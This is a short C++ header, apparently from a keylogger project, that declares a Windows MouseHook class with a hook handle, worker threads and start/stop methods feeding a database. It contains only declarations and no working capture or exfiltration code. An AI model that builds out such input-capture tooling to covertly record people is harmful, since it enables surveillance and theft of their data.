#pragma once
#include "keylogger.h"

#include <windows.h>
#include <vector>
#include <thread>

class MouseHook
{
private:
    HHOOK m_mouseHook = {};

    std::vector<std::thread> m_activeThreads;

    void mouseHandler();

public:
    void start(Database db);

    void stop();
};